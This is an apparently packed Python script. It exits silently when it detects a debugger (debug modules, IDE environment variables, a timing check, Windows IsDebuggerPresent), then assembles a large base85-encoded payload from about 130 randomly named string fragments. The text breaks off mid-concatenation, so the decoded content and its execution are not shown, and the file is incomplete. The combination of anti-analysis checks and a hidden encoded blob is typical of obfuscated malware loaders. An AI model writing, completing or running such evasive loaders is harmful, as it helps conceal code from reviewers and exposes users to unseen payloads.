#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cvIc_Haij4yvaf = 'obpA-*iH&swm%^Y0n<rF=U-yMsLSr*{9nySYc6cx?`C;OH<A98o!5GJ!|7nTQo20X=6vmDoJNNoSWRd~'
_culS6mf9r8Goxg = 's9m$ABN{(@N)mrm(L^=Rb~r1g$;Q49TVnt1fY2HP5`~kqZnFXN_w>-sbDmvy$&#n`WHD`}`hJz$N2#Wu'
_cvCl0UuNHly0iJ = 'LCskAAClIx`b+E@+v<y$xVpZ6Y#$Fupqtm$w*Tsp_VczyqgwnN!?^vXXf><lGgU9&sZWAPYTm}b9C<!0'
_csEbTZbcctXqM7 = '<qe4aGGjH;WPUdioA?|(f9hYhpA(Ja&Z7H;V0h^2C*gd6<=poE6Z07&x|cOQenJ-mZdN;x0w4~zb41Ol'
_cj7plDOZ90TC0O = 'gx&EH$X**kUP0oow4gF+>tu9|+y@1N?O{EQbQ*;!W}W;DrK<cZ?_3xIj)u)*vij;wIbJR`u{&i#G&nuJ'
_c_enjbHJQ6oufZ = 'w=rp_bX=5hgoLo`2pTx8NYxV1_v}CTXKuJqgOnmtl%BM5_Sf^!pof^ry2o4B9oLUUL8R_+T+s3676`X='
_clYIaBB8uhfL_f = '^~C4?z=snIoGDXnJ1!u8ODjtNm`M=68v?>i-rA@(`K^O`vlShzRjr)C>&*mz>?`c~sj4=h4m`jS=FaD_'
_crbEqeqBh8CGFD = 'ED<5%&!Rpl^RR5of69f9<(bzH;Yx)rZ{G-W>Q9NV<=&@)6lC)#(`!FL1A5jF`0_BmBqQCxfmnOP?I#pB'
_cwo2ELE_Sijn6C = 'mKl-lGeb-3j9VY%z~Q6}k;^@$SHY6`c6_(_59^X_1Q#f3iEZ8ldI%+67eQMXLW=%xTH+TGu0b^bnv%yQ'
_cbqrCFrd6dze18 = 'Y@Z}fJ!LQ|Ezf2sEqVVBC}i$cOj|=PgHUB!#%kX5`nQ4yc@awvZ0lHh4ShUkr?2VqZH-q#BVNVcY_T?E'
_clTo2OFK2sf5Nw = '`>n*aU1|ph3%>u%R6od1*q|_G#ZY;mcTyYwpXktwJTa<tS31v0q1G!<^QRBH^rzR4Y2C5fr>dacKDyg9'
_ccZAZmHt6KWDUQ = 'wh>rkzzi?u1c5g0xchhhVIF!WkS=80P>}}ECGNzbn&_wLq@im>B4Oo(2Ykk&Ua~TPpBIeq`{+pW0V>7Q'
_cw6qNDDJlQlqBp = 'wAf3M<n;xvcpO}11iznGzp~*?d3Ldnvm)28(JPuu<u?9k(MikCENoJ_oBS^%H)?CvUIY`hXcHwW!Lz7h'
_cpy7k7l4dFg0rC = '=OId|3O7Zunf%m&L5`Hg@zmEtvRQjEB1mZk6k*lD>%nKG4KxExI)N<C{GeG_>iU!Z*@x<bOqQ2xVVGvQ'
_cd6oOppzKiv0pw = '-i(8>a^6LMA|cs8IVz<Ev;<Tt0<b4(ak&`HPc0~U*W|01OLFz5P=jOLR}>J*C^gj(EVSf-4oH=4IG0)K'
_cp5zNJYV57lY9d = ';{EK9ag6Wc{>zX1%fB8so#op%$Hlo`6Zuju`x4PrMH}tRM5S=$o(2Bdj;Lk&Otyc5IewG`_+Lwv|B8i8'
_cvn0WmVNMsQdQ4 = 'v=U2T>3WRsqIaVDsm+KpV+S)XoL;MdfX62rKdJUy^1_^t3j%EvSm#`9Z_FF(=lE(O0O2j`#_apiLp?Q1'
_ch1JgdxFBPuk5Z = 'NIa3ne7FG7mcTvyUO3!>E6#fa7%i=V$VbGD=bOMcc*+ak_ft?1x`lSgKXo91P`oQlmgiHiQFBK*SH(sE'
_cqoF2YTYH9TMIs = '+FuzTUgqPRy+L)$Zn$=lvy*ayY!f2A;~{;8j0Y>_5>vJ;5FI_fFL>_*_K|M^0!B|^AltP{Tv$KE8Xb>X'
_csToTKNVXsur9Q = 'x+l18dc=eGfpx>8Ob)o`_r|Ph$u*Pzb+E3KtQ@5R#jA46Fy}>+mMp-BmTO5fyQgx>T7t@2m7Zk)P4vW<'
_ccIfBauWf__i8Q = 'z3IEQX-=7i8$qm~;Q4q3@gh59lJ0%zVxmP_^$cul0(JhKe?-J<WV!LZf><QH|5)1<u}SC$biyeBqt^Yv'
_cbbJIfYDfagLUZ = 'D=qt*#eaL5i9(-wwgsD#$ee6w3u`QXDyL<r!bhej-HQzDuuN^csT7wj`&RkWfg~D$le6F_sBUw0S?9xg'
_cjRF5nKqV6IPvq = 'Wt!!;a3qH6gwD5Hp4+($upuV!J9)Bm>@@7EYe8r5kT-I>sUFUCr&*n-XIIw({sbElZx#de_V<IRUu*@4'
_cq5aY8vNeiovpw = ';q_!y7%t@b3Odl`5G1t^%uSWrlN~b1$1qNUcenz^jTR3pB-dICYt`|U+kw6-AHMCD&v0D`{T)~bBkDJN'
_czGflPbwAtf3J2 = 'HzdmM%c?lEKMAK`XLECvP?x;zxbhcb*aFqJ13&7NHbtwz4}Y<!%nj5WsLxIp;Ck0on~xM|MdnKQs+O7K'
_ccAyvHzORgVowD = 'V8B;9<a&Kq?4Y{5Mcq2r6z1eHfv)j)hkZju*9d(ZPV-_lz7a~`Al-WaX_<;~CnZu-29%k>;>=y=i>^Vo'
_cgj5UjA9jjfDuH = '$i!WfZqfOfX1Ydxhx#Qsq0|hMBq8$aux8l5AuODD$@{_u5@d3!UgA{;Pc3y_M{;%gGb`|u_fUxRYUpGQ'
_clcvJ03gLiwn4w = '7rR$VB9D&}ZPVJ4Ydw?rwhFYFBxk8TzA7aD`%UKGSTNkubGsPE<5lx-oth&K9@|b{M^cV^yxK&2?7pno'
_cgCUbrY9qKgueb = 'q4aYnaei-3AVY9w4NEyKumY|WwPDhzfzN8Q=D<^djX#MVM~Yyh(|4?0Ap<2KmaEwHOKbNWx+WQ&{03rO'
_cgUZ3bj1SSfteU = '7d^dUwep1RL%tagr`rQEYqIDX4sTl_zv$-QgXzz=n%y}bM8Dr>Fzx35M+ak^Pt%+b5%DJv6VV{K2V}Yc'
_ciFldTi9rvz8_w = 'HTiW21&|U%^=cD#yT})w)pvGXtAv3kJENKZaR{t(AJi)+#P&gVOFVKHUv|$NiBq%!L-eI%c-*L6c@RdT'
_cwe2V0K7jN1Ho7 = 'go+^S6*kR!Cma8=ALU@}A3nvJhhy#@1{z-qc55<OniyJJlAQU+aCY*L5{#~<S}ilKyP)CBYs#?%uhj-<'
_cleBfLJN1IuGLl = 'eO|pP9svoHy?C2(F=e;!TLTa2Kjj{8jD3iBluTe`xvf4yOK1|#otR|Hh#$DGg{`fKqZ?0Llp{+Lb+#j5'
_cqL27FCyj3lDfm = 'Ye^3O>jH3Jk`rPvIdI*kcV+<eQ(=mvhI90um44X8wfQxCp9`^g^&IIHLMnd;lg!H>*g!pPbIQqy6l)Vh'
_cpKgLCF0BpXop0 = 'HbcrRHsPYT_AHuHm^F&mggKTEn!>$YhHT>r9Gs!J#@6fyu<g32{O5EA4XGOtCV};2%njqO<9n(*WJAB%'
_cuocCBvghOjSRJ = 'b;hVvVFL~r-99P73%+6j=In<xl$}QzxDy2@J*+Q<fp`p!HGFi66mO(4i7K%g@}o^bMKP2uOUQy7#fnl#'
_cfxb0iKsnKHSnL = '@a8L~m_TTa&Dk0J1`c2;nj%JK#DAo9;`B!`FyNIB14x{k%I2EKAH~VMw}-*o-dq-Nul&@iX#YF6uK;e~'
_ctz39ictHNl2ZD = '&TC0O8^FJiA3Qs)j;Ca1AT~ezo<8tzxI@V52J3|a<JYb&`G7pTY_aRxyJY5c6vqpr%KhdvVZ|UjsGh6Y'
_cy3djZ7VEg4ndK = 'QNi9eDm>=GU@VkAum4wvCI@XMTDN&u2eL4lU5ElqW84F!vBV50ZM6`z12Xt;ron%}rP5DgJ}Yr)K_XNL'
_ccJfAF_Dfgobad = 'BmrtUgS~LVHJp!oCk(ltnWVLkQk7w0zir}ZPbB_SxPh4nA{Vf-h+myZ=V~NRn0QUSljzNxtXe^jbBA&y'
_cbXtbMIElztCCK = 'eh0`khk&ffi5GJl7JYej9L9hs_(UHywM+^Ww7XkVU;7NRKWf-~Y8*CC+9FV&ekF7P*M7jM(y42-A;09L'
_cqjUp92XY4Xvej = 'JDjugVILd2&2?YT6wy7d;9IDy{#1AkFOXSkJe3BZvYnhVXMw!K0z{EbRI0i8^l3%qY~?wS{%bGQ77Z$P'
_caoGg5FX6giF89 = '*ukrbV#q8!4hC~DMx+>M6O9}J6;~atax_M9MHbXR6vKWNrUmmuy?T^DAga_V7AaKzt<F#g871{%f#V<n'
_cwKYbwUnSASjIV = 'BoA`Mn%ML(7DH(l0_`*C84J2q^PKA3T>W1kQ0?O=#GgoiPyUj?8csZ=ad>=yQ|vJ!UnQK}e;&QU(F|T!'
_ctGfctJZn44_IV = 'q!`OwAKs1_8~xOr<`$0vkVE2rRmr^M@n`SW3rt)xF-AjWi}6@p-M>dKo1js68|ZZO$I1)jMt;DjQJcpG'
_crkhWsAy4ICiD5 = 'a6e0HNaM)Kh(ieOQ=EO~Nr(Q)lf5K2^vVT$<FuohVTpXi4NI}rRz@$NnNugrpTKtqA*7N|4PsJOXi!+~'
_cjBORUmVm85wiq = '8FY-*|I4v^Oo|$JlMf%OY0kJqBhHb*J@76nq=viK0DDj%NrgxHb7$&+^}@vc@`ch{X=dErZz?9(#nUM{'
_crpBp4odazG2Df = '@Jbd+9wd+bVd($+Mn&!0+$tn)vhhTw`dJ*7f#GQaG-$}#8DpYXgmwRtZc$&^QQa7M)I#?P)sTL-AK=GB'
_ci7jKqZY8Mhe4a = '?aN#Mc;Xv;tM)bkvx`4zyKptO^9YGBgpgTOEe7wvzV!RlN%@t!q1%@-@2l|xzp6mga2UAPdf@7v!Zv=0'
_cudhhRkR9YsEkh = 'h6X~7KIQK=8xbMO20=wr)W8i8(Tx>7t~QAj92L>8hksJ8KBDH<yT==2*eVP)S14X#^<6uF{vkPgy?toz'
_cn7u55lZN1GFDe = '%B#bS6%qU1Zw}@W+^cgLWH7Vw1&(Bp303l`resOGAY6Jk9#a3@{7a3e<Q2@OTxU>cS;S;5T^v(La<7j2'
_ceo1pTQ1xlSmSR = '$mV1Apk-t~R4=BL92k_)*(?N12C{6thfcpK>lD((uJ%_KP~y%rXeqoZ070Dn?DQe(PS$@~zjb`w<8`6K'
_cmM17Quqe76NJB = 'XEC7jM>Xo;Rw3@$-Q`%G__vBjK`>1jN?QPODkt7!-?N?C(FvrxIM&dK+ZTB_2H!CSVN5MmDSH*JG>YZo'
_cs5JJaYLQ_MiJq = '?~YehSA2<QouxZWM4Zbjvv5BP_8m9QvGbmlD2T5Gp<$QXZ4VM26iL=$TzS$H*7flt>`Z`cEx$`y5v568'
_crJCTRVRhCA_pq = '<{Z}dhtJiIqhc^PZuYx?YM&O4o90sL<D^uanYR<r_12GrC+^3=VxGFx=00s}JCK|)qPt!aUWHk1K`4L`'
_cjKxESBft05D2X = 'uYd>GWdFOEs0FVfaynI4I8yXitPFk0OK>y5UbU*{qIsr*ii$XE6&~o=IjpUR+O665O?NE8cu{K7hM@Li'
_cp_b0ft0pl_Cko = '6HPa7V~+atzFdJie-$P&S&KJ0c~6x|dK2ngHB7~$ZJ+Q&Y|3$((OHIi>-PA2t;TxhT;Kjs)TH~(Iy2@W'
_cuO0peyfPOIeRB = 'qLjNmspy+}A(z3o(Ot=z63<%F%qV?x+tVXxY$qUPBk*49<+VTP<lhl4r&k*JULVC1C4@f$g7}O_{C<|E'
_cyErpVuNRrlXpE = 'L9F46B#@~X-JO4lL1kA|IuY~Gv0~}*3$6UBw2|#CxK8igHCwJ2eca+0p*WgRYr13cIdO?E+bSce$oD4m'
_ckMAGjiBuIrCSY = 'm1~6PURGuUnxk9)?nm>o!F&I37LDDe1VJNY8Tqyq6o8Dcs+ALu6EchdU(+)lC1-eFaVm^UINbt^Ly|dd'
_ccT61amFVQLWi9 = '_Lay-H^71PY>;~vFX<N-h@lu}0v@C{<T*WpIbqmB^M_xqC;Elhv0Em$(qL}B+MU+fQPnb|Dbx(OR7bD}'
_co7uaAdABpFD5N = 'gf{E=26kkzFZ-=d?!hx<r(ByJ%?02h!Ryg?-_33(zmc?D#a?l{1KO8Wl;-}LX%zb^D_q#X^rEp~yZ#7)'
_cwlQEKqEBqkoKj = 'b4b|Af>AQq{!!{!Ga78m3p}#?rljA1gfH#2zM7!?0VKx3*&@%<cpAbj@<ghG3mNn5IPzcbK2+*4fsxg*'
_cycNeZ0jtoDdg6 = 'hL`SsL}4?5l%WRF>8%Ps+8>nL<YymdIY$h!wG5s#v@1?X(~EKU2vM>FN5vx6CRu?Sqsh=uY36>h*uY;x'
_cbSP8bv7MGqZnv = 'Cc#ioJB4$-PV10oAVDTr_rWY$>;}@ILxy$e4z$P&#SuaxuzAMR23CGk5+vPqMsSqr8E~a&Z5)A5++2}q'
_cp2QWzTJNkBohn = 'pa5ld6Mw*%Bn<wTJz6T8iVtp52EyfNvu_nFo-;=mTA)83Gl>;To)yKGcH6k2?3YAgrsEY6j4HtK7gZiZ'
_cziVZgE09yOo3e = '4+~|vp9N_(=L5e1*MH{>Gj|)YNJhJ+aY&E@Zl7*zkInSRVSm>cg*Q~%2PNnheK>m;&_Z3VgcxS@iZ4K9'
_ccQm1HhSSSPFtX = 'rX-zo@pB(MAkxAi$s7&xnjO+_xBjK%Y-Y_24<jp1LGi5^xtcNNB|n0|sm*28?e3+V5T5hh^+{VBnixC&'
_cyGcyy2Gt1_kZa = '5XwG2WfkRaHwQ7ta9lO)PZz@~U|X{bKv3$F(0SQ}dePUl1w|V=>uiBKQbd-ll&@!SS9g&tv5Zc60k}EW'
_csbaXnV2iblgxh = '(b&T-%1CZLR=!W`TyK*BDCTeiPqo37K1Lc7LQ`lQj=V18R8JEI@=s|wN0<fF87CW6TaBThNDZcB;p%cb'
_cs3sf2vUmgPYZ4 = '7wG6Glp<Q-oVoh9DuNIAAjs4L@P---iBwLH6}4CM!c6z_%<fdRed6-HF?G&qmr>YoWn`Mp7so#FtoNhw'
_crRFGYdyOZvjCE = 'Wb2|~uc)w!Pe2bnL<5eq>K?s}%nJCfQhvH0ab#abui6j{TIQ`DSrd+M<P1K8Yq}zd&7?NDxV!dMq4NZa'
_c_qXnOkmbiPJyR = 'O}B2Ezdq8UjF9W~TIfwwBS~^IfE><w89!16b72@FAT;*3P<qc7TA{vV<x&_plyl8N=VQ_vsJ*$GF-e!!'
_cn8eo_84G4U4vB = 'H;pTlv4uC-y-_Aoa1?drtG)Eh=VQ*(6Op)f>LQjr97NS0T167<Q6ZaktK}MX?f^(Pq!mb7o$5_R<b=YW'
_ciaeKAQbSdTtHB = 'Ad$aa&<ic!Ut2PC2I*D`F%hgQE8Q&#G__3Yo+hPHMtedYyUE{r$r8Fog}vT8hK~wC1WdK_d@Nh=k4ML;'
_cnT_FrEkcqqwj1 = 'V)a4P0px%mRVivI^kXNy-oMU%T!BTlpT)K3I|rS7^W_)&b8A3zVSfVaZ@P~fK9y{H&cnq7uhVH!rk<p>'
_caiW4SMUnnMV_U = 'BUXeQ%*E!S%!FZ`9DE0##*erRNIRF(<Dy15?Hk5IBOxbK;V`)76uzitZkj@-)S4z_5d6)3Y$=6#&fI^Y'
_cxT7Yv8QrxzYKw = 'Ph?nfVFPjG0c3J@MMf}M8+1I8w5OB8Re4mOgTe-wH|G;Cy57>bY8_UjITg6hZ$U<02BXbOfHc}zVw&OJ'
_ccL0oH6VJ2JlA3 = 'd-Dz^{eEen9nG^-?3Ny2=o!C$(z~gsU4OS7U!E4=UU{R%v7(}}(sqbtls?*G?AA);4AADp6#DI!P`Fj8'
_cxBO5v68t3kh4h = 'c(bPTx+5Ml6!NZ2uJDi)_6tf%z3(7eenUj)nRrQ`Yb8;NjMeMX$#He?5wD72Q?6R97Hp?qWlm9PCeM%g'
_cvSHRknEgGQVS2 = 'IZRYY#6DN3>Y91&Hp5D}>3Z{dANx5~ux`LWP?14sCk8}BpPhV~EAS|12B$x&n_m$~e<`Sb=QolO#6g=l'
_cvaIdPMGuMlUc4 = '!TnHalb9>VKvrFCQ;Iz9lf5<Kp!;vN<P1U&EI1?8^ezQW(0pAh<wyoAr<bzk6v+pjx74g78-gcAmKNIQ'
_cm6f8kzizdPmZE = 'wSy6bO9@oa@(;8W_1Z$T?%*dfgLGo+>Y*g!Z;OwaHIM`3hWfe;=XYjfmpVVTjW=b~HROD5s-zE)VS^$x'
_caPQmR6enRf3cl = 'ZSDHwkf#7KEvTCv=?GWEtEVG2rEcgKt|w}z@4lu5*k&SxD;H0Y@o3$NCMn-iQuK;|IpDM3wk7#kTyXuV'
_cwVH8hv4qyO0BX = '8S)4$TE?((ggl*YC7ie=$h_&i;GgxGcFS#L@e`8MMsX!B1Z$bqR;0NX3mdafWTf-e{cRWr#ery?m}^w%'
_conC3OZr62sCEU = 'O*Xcr*3w4izOu8z$Sk9mG-#t#_H5TgX<BNE%8F`pe_z;&ZWWs&@i_7K4!ibvzz)(D{J%5D5!bbo_nYAA'
_cvYF5sgMocmbYX = 'O9-KdqK*@S*_f!m>a=f}XEj=IPd>Ucd~$`nX7ySWn^kC)nD|l7rYDK>(PTGL^f=&i8J_GI8c~WOTsMh4'
_cwQvIyZyRArWUj = '8Y#`JVTTkQY<jgyK_9);8x=*rQ)J!VyD3ig+4E@}42D6w^MZ+t-+(K$$VUjvVSc|XI_+31MrwcAo|Dox'
_cyRshN4OXknPos = 'wAVE@)37`zK1G^d=e6##66<;Cjsqp~3Her1$&Yzzvpu*-n{;}IT(SzCibmcWU)_XmC+D^-vbJwO7&^s0'
_cbaLD_lALX55_e = 'Qk2K&Q|-t{84Aw<axG|YvSrM!6@j$DPLsoawv&4j3<Ve#3^vTDR(>Yp>aYiMV_f6UHXxI0SUt);rO!Uq'
_co43abIFguf5FO = 'iQ_(!@(1Qt&wjfSnss^-c7S-k$D_IbFkL0Bdlwzl-Ht>lt7WTK64ZNW#%$)ZS8b{Vk~_fQaVsomTgPCl'
_cpu0OhKBLJ1r4g = 'q|3wGh{yhFa;qg%>P6J9go^+Wo*U_C0#o+}wKs+5%}2L|vpvfe?66*Y-rAM1eO5(Mq+-%f0LLXxqWTCK'
_ciRc8wvq_6ku16 = 'RrU%*w=bFpE&}=^1@Zu5iyv<2axxFZqM19ST}d=-WQZi+_k_#{R%w-?BB;4jv+fL`s*MdBl*eOTn7UF*'
_ceKVLHLaFf6Tro = 'eYZ(6u(~BorNzGEONK4Hq;;^=VArNr*KoYI*${Kzt`$zsuE}nw|2(#@r&IBEWHlrLg>PL%I4(DK^X~)~'
_ckqaHVjqG6fADv = '>xeB`!c^!fC2Rxc`1x~M30@Y=ZJocTose_K>!EZx^?veYfO+(|)QV;vX=Cf3Z%WGaB)=y1Fu92Jjjf-p'
_cwQPBPBF5nt007 = '_K5K9BfpnjcJ|Nja?5`$`ry9YJ3|i*n<CHzzK@^VTnWuFSN`8gW9^(1?TPu?*!OH*lS8H8d)bfTF6*0p'
_cjExKuhHQiS5qz = 'dgziL_uI!~twmU&9MmMur@sS;PCwVhN&*UFPGltyQg42YqW6u)W<y9<pBXz*75hr%=VN291+{y3l*lod'
_cjVRNsfWVpB4_e = 'S)ejof%nlpO=1jOf$H%;#z5Z*(mhdahys*EeAezIwexoo55Y2a36a>Onkj)|wg4O+Dm9Wz@d^7k1Za>_'
_caI33aHLGk7LaF = 'sBL<=$R1{I9%v-0gub?AC54RtK~PEqsiBGJh`(VWp*XyXqr)Dv#R9X1tFVH4fVv3?hbOOByqjzG5h5l~'
_cgGQNsXo2NZ3dE = 'cTevp9V(3sVQaF`(XaedoCmsQC>buqWyZWL3wjQUhVp%dN;bV((u~1w@YA;6b5?C9jR^m#G{~{jff+G}'
_czBBcsVywQOh_W = 'vgEYsHVbs=)1t}4mQ8B!zoXEkXPx_`pnbO9eaAN+8YSGIs8r(NCk&v2OR`8kFxXK&WPx~1$Q`g~atCe)'
_cx3b4O9KMBUiZz = 'Sll`;d|<TTds^i6gJxiEI^Xvf7#ipchCmE2KR`jXu$KUX(LeS*NVrRcoq<vM%tK{+eIb;<46O@3S|R=('
_cjxooeJyrFsUvS = 'oIHxpoEgu#eNYN^a$U2jG4S2BxM)1UsDOD+U;>F)9hxQ`T}$KMR2fv{Z)T)oEgNoX(X|<waMv-^P=7Qm'
_cfhAWcZbgt2pNU = 'F=nefDHQpHt#)W?Y%$&})&Lsj*rhgY^1A`3&QWK_6gUIY#Vh#g|6i!>MQ3$ocynivEgMdj;)ht;AY^-g'
_coK3N4LpKNzTim = '8i3*EtD>akbi}Y{?+pa|Zl3Fdw<uDY4BzPzVVC5wo8r-`Qc#7?E;l$^1}3Vs%fYwN22L8yWP#-hhrJhF'
_ctbu2W0tXTrujD = 'tm<g860PnWhcW9FsX?ZMy<^>|`l)IJK6^C-Iul+Tc*g<j&mO(+pN4K0$LPk5FJiw*T6N&MlAzN(IQ4-#'
_ckaemADGDdxsbT = 'BJ4)=Qf#8czCyy!+=FmoXK#u>c_^d-{5szQB^a1`O?28h@fxb0Pg05&mS~1IwC-CZ=^{>cf%W%X?3?%>'
_cockzCBNd8tEkb = '&sxCR_agtxA5%$8Fra{er~+}oVZ0B@r0_@cE#Y_#wJ`hHUE{yVTH<wt(*3atc_ML8T(be&F`Zir=dL>|'
_chzhUCJk28yC9d = 'AyQ89vbY1Wr{qGA@Gms`SZDvQ6z(G&9#o_?LNdofGi#ugYRyq|z(e_7!)3$c+G9)Z)prPMZoJz1K%C^u'
_cqUNE8G0KXHYvV = '(+ABk|EL|Gh1`vA95bGz4TaNNdW=x+-40p6+FSkXo_ADSpeVy=o_>wgmThjmSuDD0cdqD8w@jE{-%6us'
_cbwsBF7fDNhILP = '-%!NAtPagC{~d*>0tqNJBL6?qkXE03`#yyz>Vw~1OL?1_)OX-J#xPX;Dbs^R^`_#dxf4}KGi*T;zl?EU'
_csc0Ru93CF9kMr = 'AFR3Ch>AZ%Nmx_%z>z~7U~_qM=08_wzBC`pId{IKAS3xu>(}dN!1p&fo+2N*f}TN90c_vT;v;Hrm;FX$'
_cr0amPLLQ1BWiZ = 'iMuwg)9n25h{iq?!dU(NxnS-sg$bY-{h-;ueT7K7l{FT{)U;oXIKdVq0<*>NOW*v0=)wih=Jo~Kb;TON'
_cqs4iiiFd5nsHo = 'g+tiR`WI~Lt)T2b#N{p9f=EQzXmJ!|cS*3!=U1#B(l=T-?jB78oO(>Fq*Pgk!QCk9`kXw4;LKB!nDRK)'
_clRgKVXzcVTjl9 = '_!P^3NQ+cbyD^7^v(NahPLl2;0u}hmT@HZzw4MFcn3%VJ?JLm(+oE;!Px`Hi=BxIVZBu}8gS#wn4C4>I'
_cpUrQW38K7RZnB = 'k?0fPytsT`Bb+LvOr}6&#=>$69LtOc>_UJ`)!`dWV-FRl`Jm&m?7#=rNmz9s*82*OuF%aovU+d_5yd-N'
_cfTQLQHWn2u7Zw = 'oem$vJ^uJ(%G~@m^V~}7s*WsvVeQk$0@#BiLz^MEW3<ynrq0Tuc8^4hk`Hf^MMcx*c9nwH89@w!S+TR$'
_cljj_DBbqD9L5q = '0Jy@V;bv{^?IK>k`}m7DNG@gEb@kGya_w@^y-WO$9ZxVVub)Q<puwASflrgrA><q?fzT0VYa<4+hGEeo'
_cibza6sOEyYY0j = 'LJObi{E$uu1e%i?EGE~#IWK$yi>9n06nnyM?ng|n^BYT6Xeni=gGnREV(C3bZ|gmmJGx5uM%nmmUvN94'
_cgk78f_Qf77h1x = 'zK8fgclTIKMQOjz&Xzde|E-<As~GOz)QlD*1T&?$?rX72cq1={woyKk6)$oSwodi3F#1Du+n*m!c}?zd'
_c_Kmm3dD8eDA0v = 'b%u1C932VrPu=aEX*SGvASUAsoT7%SA!e(Jis1&1j8`UL?LuoXZWOPO=8%<N7=wm(8rJi906@YHHp^W4'
_cnPo14sO9lDyJC = 'G$XWcz*$Lt8P@OaRrkXDBsL=6QxbHDm_Sg_WYKl2clwnV{*(}+x;p;SJ8Fq%Gt)b(?}Gf1meE^bElXV2'
_caDBtywy2muPlx = 'Fh6y@mH=3n`dPQ^P24?tcFqE#=st53Qn<=cNYzPB9E3};MU+o5PSegKMeg6;f5`ipDQ2`NKvK}I|GHIr'
_cpISwtoIRDYUOf = 'E?7d?7%%0Lw-`%RUV4K?jt!H6*_!NNX4p3_X%?n9I3ns@FJ;MAH8`HvRV@%{M)rdclJVd)V@ZgEx1{8;'
_culJ5WKETaYYV7 = '<yfR_TJT+tC8!`{n7xQpg)j)+*eHK>{7;|b@)nmf$b>Px1zz}|E^HWBFBuxh?7IZ0tM(PgaXR?|Kis?W'
_cxWwtGfrMPQnVy = 'A<D<v#~dvg-K@d-4;r#w8{=5~fdCv<JJzxT|I1kKJi$Go#5IYQg=cp&`czh54=R}s+5'

_ptRBGw2LsXGV2n = __import__('base64').b85decode(_cvIc_Haij4yvaf + _culS6mf9r8Goxg + _cvCl0UuNHly0iJ + _csEbTZbcctXqM7 + _cj7plDOZ90TC0O + _c_enjbHJQ6oufZ + _clYIaBB8uhfL_f + _crbEqeqBh8CGFD + _cwo2ELE_Sijn6C + _cbqrCFrd6dze18 + _clTo2OFK2sf5Nw + _ccZAZmHt6KWDUQ + _cw6qNDDJlQlqBp + _cpy7k7l4dFg0rC + _cd6oOppzKiv0pw + _cp5zNJYV57lY9d + _cvn0WmVNMsQdQ4 + _ch1JgdxFBPuk5Z + _cqoF2YTYH9TMIs + _csToTKNVXsur9Q + _ccIfBauWf__i8Q + _cbbJIfYDfagLUZ + _cjRF5nKqV6IPvq + _cq5aY8vNeiovpw + _czGflPbwAtf3J2 + _ccAyvHzORgVowD + _cgj5UjA9jjfDuH + _clcvJ03gLiwn4w + _cgCUbrY9qKgueb + _cgUZ3bj1SSfteU + _ciFldTi9rvz8_w + _cwe2V0K7jN1Ho7 + _cleBfLJN1IuGLl + _cqL27FCyj3lDfm + _cpKgLCF0BpXop0 + _cuocCBvghOjSRJ + _cfxb0iKsnKHSnL + _ctz39ictHNl2ZD + _cy3djZ7VEg4ndK + _ccJfAF_Dfgobad + _cbXtbMIElztCCK + _cqjUp92XY4Xvej + _caoGg5FX6giF89 + _cwKYbwUnSASjIV + _ctGfctJZn44_IV + _crkhWsAy4ICiD5 + _cjBORUmVm85wiq + _crpBp4odazG2Df + _ci7jKqZY8Mhe4a + _cudhhRkR9YsEkh + _cn7u55lZN1GFDe + _ceo1pTQ1xlSmSR + _cmM17Quqe76NJB + _cs5JJaYLQ_MiJq + _crJCTRVRhCA_pq + _cjKxESBft05D2X + _cp_b0ft0pl_Cko + _cuO0peyfPOIeRB + _cyErpVuNRrlXpE + _ckMAGjiBuIrCSY + _ccT61amFVQLWi9 + _co7uaAdABpFD5N + _cwlQEKqEBqkoKj + _cycNeZ0jtoDdg6 + _cbSP8bv7MGqZnv + _cp2QWzTJNkBohn + _cziVZgE09yOo3e + _ccQm1HhSSSPFtX + _cyGcyy2Gt1_kZa + _csbaXnV2iblgxh + _cs3sf2vUmgPYZ4 + _crRFGYdyOZvjCE + _c_qXnOkmbiPJyR + _cn8eo_84G4U4vB + _ciaeKAQbSdTtHB + _cnT_FrEkcqqwj1 + _caiW4SMUnnMV_U + _cxT7Yv8QrxzYKw + _ccL0oH6VJ2JlA3 + _cxBO5v68t3kh4h + _cvSHRknEgGQVS2 + _cvaIdPMGuMlUc4 + _cm6f8kzizdPmZE + _caPQmR6enRf3cl + _cwVH8hv4qyO0BX + _conC3OZr62sCEU + _cvYF5sgMocmbYX + _cwQvIyZyRArWUj + _cyRshN4OXknPos + _cbaLD_lALX55_e + _co43abIFguf5FO + _cpu0OhKBLJ1r4g + _ciRc8wvq_6ku16 + _ceKVLHLaFf6Tro + _ckqaHVjqG6fADv + _cwQPBPBF5nt007 + _cjExKuhHQiS5qz + _cjVRNsfWVpB4_e + _caI33aHLGk7LaF + _cgGQNsXo2NZ3dE + _czBBcsVywQOh_W + _cx3b4O9KMBUiZz + _cjxooeJyrFsUvS + _cfhAWcZbgt2pNU + _coK3N4LpKNzTim + _ctbu2W0tXTrujD + _ckaemADGDdxsbT + _cockzCBNd8tEkb + _chzhUCJk28yC9d + _cqUNE8G0KXHYvV + _cbwsBF7fDNhILP + _csc0Ru93CF9kMr + _cr0amPLLQ1BWiZ + _cqs4iiiFd5nsHo + _clRgKVXzcVTjl9 + _cpUrQW38K7RZnB + _cfTQLQHWn2u7Zw + _cljj_DBbqD9L5q + _cibza6sOEyYY0j + _cgk78f_Qf77h1x + _c_Kmm3dD8eDA0v + _cnPo14sO9lDyJC + _caDBtywy2muPlx + _cpISwtoIRDYUOf + _culJ5WKETaYYV7 + 